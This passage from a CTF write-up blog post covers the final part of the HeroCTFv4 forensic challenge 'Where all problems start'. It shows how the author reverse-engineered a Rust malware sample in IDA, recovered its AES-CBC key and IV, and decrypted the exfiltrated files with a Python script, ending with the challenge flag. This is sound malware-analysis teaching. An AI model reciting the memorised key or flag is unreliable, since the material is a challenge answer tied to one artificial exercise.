+</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\w</span>0rty<span style="color:#ae81ff">\.</span>cargo<span style="color:#ae81ff">\r</span>egistry<span style="color:#ae81ff">\s</span>rc<span style="color:#ae81ff">\g</span>ithub.com-1ecc6299db9ec823<span style="color:#ae81ff">\a</span>es-0.8.1<span style="color:#ae81ff">\s</span>rc<span style="color:#ae81ff">\s</span>oft<span style="color:#ae81ff">\f</span>ixslice64.rs
+</span></span><span style="display:flex;"><span>PadErrorOverflow when calculating number of chunks in inputC:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\w</span>0rty<span style="color:#ae81ff">\.</span>cargo<span style="color:#ae81ff">\r</span>egistry<span style="color:#ae81ff">\s</span>rc<span style="color:#ae81ff">\g</span>ithub.com-1ecc6299db9ec823<span style="color:#ae81ff">\b</span>ase64-0.13.0<span style="color:#ae81ff">\s</span>rc<span style="color:#ae81ff">\d</span>ecode.rs
+</span></span><span style="display:flex;"><span>internal error: entered unreachable codecalled <span style="color:#e6db74">`</span>Option::unwrap<span style="color:#f92672">()</span><span style="color:#e6db74">`</span> on a <span style="color:#e6db74">`</span>None<span style="color:#e6db74">`</span> valueC:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\w</span>0rty<span style="color:#ae81ff">\.</span>cargo<span style="color:#ae81ff">\r</span>egistry<span style="color:#ae81ff">\s</span>rc<span style="color:#ae81ff">\g</span>ithub.com-1ecc6299db9ec823<span style="color:#ae81ff">\g</span>lob-0.3.0<span style="color:#ae81ff">\s</span>rc<span style="color:#ae81ff">\l</span>ib.rs
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>We already knew where the base64 lib had been used, and we could also expect that the glob lib was used to list the files in the &ldquo;Documents&rdquo; folder of j.bertrand.</p>
+<p>That left us with the AES lib as being the only one whose precise use was still undetermined!</p>
+<p>Itarow sent me the three files that he thought might be encrypted by the malware before being sent to the C&amp;C. He was pretty sure they were being sent to the C&amp;C, so we had reason to think it was the malware sending them.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>&gt;<span style="color:#f92672">(</span>°~°<span style="color:#f92672">)</span>&lt; $ ls -lrt encs/
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> ani  podracer   <span style="color:#ae81ff">208</span> May <span style="color:#ae81ff">28</span> 18:04 enc_maybe
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> ani  podracer <span style="color:#ae81ff">16480</span> May <span style="color:#ae81ff">28</span> 18:06 enc_maybe2
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> ani  podracer   <span style="color:#ae81ff">112</span> May <span style="color:#ae81ff">28</span> 18:08 enc_maybe3
+</span></span></code></pre></div><p>The first thing we need to check to see if our AES hypothesis is valid is the file lengths&hellip;</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#ae81ff">208</span> <span style="color:#f92672">%</span> <span style="color:#ae81ff">16</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#ae81ff">16480</span> <span style="color:#f92672">%</span> <span style="color:#ae81ff">16</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#ae81ff">112</span> <span style="color:#f92672">%</span> <span style="color:#ae81ff">16</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span>
+</span></span></code></pre></div><p>Since AES works with 16 byte blocks, we have a strong indicator here that these files might have been encrypted with&hellip; AES!</p>
+<p>To go further, we would need a key (and maybe an IV, depending on which AES mode was being used). I decided to use IDA and only look at the disassembly</p>
+<p>Among the interesting strings I had found with Cutter earlier on, there were:</p>
+<ul>
+<li>&ldquo;tjaHIm79Qa1IjDuAhnsDCxrtpyUiaAoO&rdquo;</li>
+<li>&ldquo;hello world! this is my plaintext.&rdquo;</li>
+<li>&ldquo;src\main.rs&rdquo;</li>
+</ul>
+<p>I tried to use the &ldquo;tjaHIm&rdquo; string as a key for ECB AES, but it didn&rsquo;t work, so I had to keep on searching.</p>
+<p>So I decided to jump to the code that used these strings (<code>loc_1400027b9</code>), since one of our ideas was that one of the encrypted files would match the src/main.rs file. Also because the &ldquo;tjaHIm&hellip;&rdquo; string is 32 bytes long, which could be the length of an AES key.</p>
+<p>I gazed upon the code in the graph view of IDA and was still struggling to make any sense of it. But I could at least describe an overview of what was going on:</p>
+<ul>
+<li>The &ldquo;hello world! &hellip;&rdquo; string is loaded from memory.</li>
+<li>The &ldquo;tjaHIm &hellip;&rdquo; string is loaded&hellip; but ONLY the first half (16 bytes) of it!</li>
+<li>Some operations are done (like&hellip; setting up the AES cipher?)</li>
+<li>The second half of &ldquo;tjaHIm &hellip;&rdquo; is loaded from memory.</li>
+<li>0xe0e0e0e0e0e0e0e being loaded into RAX, and placed onto the stack so that it made the string &ldquo;hello world! this is my plaintext.\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e&rdquo;&hellip; This is the string being padded to a 16 byte length multiple! This is exactly what is done before an AES encryption operation!</li>
+<li>Two function calls</li>
+</ul>
+<p><img src="/img/waps10.png" alt="">
+<img src="/img/waps11.png" alt=""></p>
+<p>All of this information is enough to reconstruct the AES ciphering process (and parameters). The padding operation serves as a marker: we can suppose it is made right before the &ldquo;true&rdquo; encryption operation, which allows us to separate the process in two: the operations made <em>before</em> the padding would be key expansion and stuff, whereas the operations made after the padding would be proper encryption. Since the second half of the mysterious &ldquo;tjaHIm &hellip;&rdquo; string is loaded into memory after the alleged key setup, we are led to believe that the first half of this string is the AES key, whereas the second half of it would be an IV. It has the right length for it!</p>
+<p>The only thing missing is the AES mode used, but since we think we have a key and an IV, it can&rsquo;t be ECB. CBC is very popular (among CTF players at least, I don&rsquo;t know about real life :S ), so that is went for for my first attempt. To my great amazement&hellip; It worked!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>&gt;<span style="color:#f92672">(</span>°~°<span style="color:#f92672">)</span>&lt; $ ./tester.py 
+</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#34;Hello {{firstname}} {{lastname}},\n\nWelcome to our company !\n\nHope you&#39;ll enjoy it !\n\nYou can feel in touch with us by reaching us via {{email}} or {{phonenumber}}\n\nBest regards,\n\n{{signature}}\n\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f&#34;</span>
+</span></span></code></pre></div><p>We can see our beloved AES padding at the end.</p>
+<p>I scripted the decryptionning of the rest of all of the files at once:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Cipher <span style="color:#f92672">import</span> AES
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>key <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;tjaHIm79Qa1IjDuA&#34;</span>
+</span></span><span style="display:flex;"><span>iv <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;hnsDCxrtpyUiaAoO&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;encs/enc_maybe&#34;</span>, <span style="color:#e6db74">&#34;rb&#34;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>        enc <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>aes <span style="color:#f92672">=</span> AES<span style="color:#f92672">.</span>new(key, AES<span style="color:#f92672">.</span>MODE_CBC, iv<span style="color:#f92672">=</span>iv)
+</span></span><span style="display:flex;"><span>print(aes<span style="color:#f92672">.</span>decrypt(enc))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;encs/enc_maybe2&#34;</span>, <span style="color:#e6db74">&#34;rb&#34;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>        enc <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>aes <span style="color:#f92672">=</span> AES<span style="color:#f92672">.</span>new(key, AES<span style="color:#f92672">.</span>MODE_CBC, iv<span style="color:#f92672">=</span>iv)
+</span></span><span style="display:flex;"><span>dec <span style="color:#f92672">=</span> aes<span style="color:#f92672">.</span>decrypt(enc)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;encs/dec_maybe2&#34;</span>, <span style="color:#e6db74">&#34;wb&#34;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>        f<span style="color:#f92672">.</span>write(dec)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;encs/enc_maybe3&#34;</span>, <span style="color:#e6db74">&#34;rb&#34;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>        enc <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>aes <span style="color:#f92672">=</span> AES<span style="color:#f92672">.</span>new(key, AES<span style="color:#f92672">.</span>MODE_CBC, iv<span style="color:#f92672">=</span>iv)
+</span></span><span style="display:flex;"><span>print(aes<span style="color:#f92672">.</span>decrypt(enc))
+</span></span></code></pre></div><p>It turns out enc_maybe2 was an opendocument spreadsheet, and the flag was inside one of its cells :D</p>
+<p>Flag : <code>Hero{024bcd670b1a35fef0ec6a547a20cfbc}</code></p>
+<h2 id="conclusion">Conclusion</h2>
+<p>Thanks Worty for this awesome challenge which covers different analysis of multiples files, and thanks SeulAParis for his help and contribution for the last part :)</p>
+
+    </div>
+  </article>
+
+  
+  
+
+
+
+
+
+  <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/categories">Categories</a></li>
+         
+          <li><a href="/whoami">Whoami</a></li>
+        
+      </ul>
+    </div>
+
+    
+    <div id="toc-footer" style="display: none">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#part-1---usb-parition">Part 1 - USB parition</a></li>
+    <li><a href="#part-2---disk-parition">Part 2 - Disk parition</a></li>
+    <li><a href="#part-3---memory-dump">Part 3 - Memory Dump</a></li>
+    <li><a href="#part-4---pcap-capture">Part 4 - PCAP Capture</a>
+      <ul>
+        <li><a href="#reverse-engineering-the-rust-malware">Reverse-engineering the Rust malware</a>
+          <ul>
+            <li><a href="#cutter-and-ghidra-decompiler">Cutter (and Ghidra decompiler)</a></li>
+            <li><a href="#ida">IDA</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#conclusion">Conclusion</a></li>
+  </ul>
+</nav>
+    </div>
+    
+
+    <div id="share-footer" style="display: none">
+      
+      <ul>
+  
+  
+    
+  
+  
+  <li>
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fblog.itarow.xyz%2fposts%2fheroctfv4-where_all_problems_starts%2f" aria-label="Facebook">
+      <i class="fab fa-facebook fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2fheroctfv4-where_all_problems_starts%2f&text=HeroCTFv4%20-%20Where_all_problems_starts" aria-label="Twitter">
+      <i class="fab fa-twitter fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2fheroctfv4-where_all_problems_starts%2f&title=HeroCTFv4%20-%20Where_all_problems_starts" aria-label="Linkedin">
+      <i class="fab fa-linkedin fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2fheroctfv4-where_all_problems_starts%2f&is_video=false&description=HeroCTFv4%20-%20Where_all_problems_starts" aria-label="Pinterest">
+      <i class="fab fa-pinterest fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="mailto:?subject=HeroCTFv4%20-%20Where_all_problems_starts&body=Check out this article: https%3a%2f%2fblog.itarow.xyz%2fposts%2fheroctfv4-where_all_problems_starts%2f" aria-label="Email">
+      <i class="fas fa-envelope fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2fheroctfv4-where_all_problems_starts%2f&title=HeroCTFv4%20-%20Where_all_problems_starts" aria-label="Pocket">
+      <i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2fheroctfv4-where_all_problems_starts%2f&title=HeroCTFv4%20-%20Where_all_problems_starts" aria-label="reddit">
+      <i class="fab fa-reddit fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2fheroctfv4-where_all_problems_starts%2f&name=HeroCTFv4%20-%20Where_all_problems_starts&description=HeroCTFv4%20-%20Forensic%20-%20Where%20all%20problems%20start%20This%20is%20the%20write-up%20of%20%26ldquo%3bWhere%20all%20problems%20start%26rdquo%3b%2c%20a%20forensic%20challenge%20of%20the%20HeroCTFv4%20created%20by%20Worty%20.%20It%20is%20divided%20in%20four%20parts%20with%20four%20different%20files.%0aPart%201%20-%20USB%20parition%20For%20a%20change%20of%20pace%2c%20a%20company%20has%20been%20attacked%20again...%20Nevertheless%20%2c%20the%20means%20used%20here%20is%20quite%20original%2c%20indeed%2c%20it%20would%20be%20apparently%20a%20food%20delivery%20man%20who%20would%20be%20at%20the%20origin%20of%20the%20initial%20compromise." aria-label="Tumblr">
+      <i class="fab fa-tumblr fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fblog.itarow.xyz%2fposts%2fheroctfv4-where_all_problems_starts%2f&t=HeroCTFv4%20-%20Where_all_problems_starts" aria-label="Hacker News">
+      <i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      
+        <a id="menu-toggle" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;" aria-label="Menu">
+          <i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+        <a id="toc-toggle" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;" aria-label="TOC">
+          <i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share-toggle" class="icon" href="#" onclick="$('#share-footer').toggle();return false;" aria-label="Share">
+          <i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
+          <i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+
+  <footer id="footer">
+  <div class="footer-left">
+    Copyright  &copy; 2024  Itarow 
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+        <li><a href="/">Home</a></li>
+         
+        <li><a href="/categories">Categories</a></li>
+         
+        <li><a href="/whoami">Whoami</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+
+  </div>
+</body>
+
+<link rel="stylesheet" href=/lib/font-awesome/css/all.min.css>
+<script src=/lib/jquery/jquery.min.js></script>
+<script src=/js/main.js></script>
+
+
+
+</html>
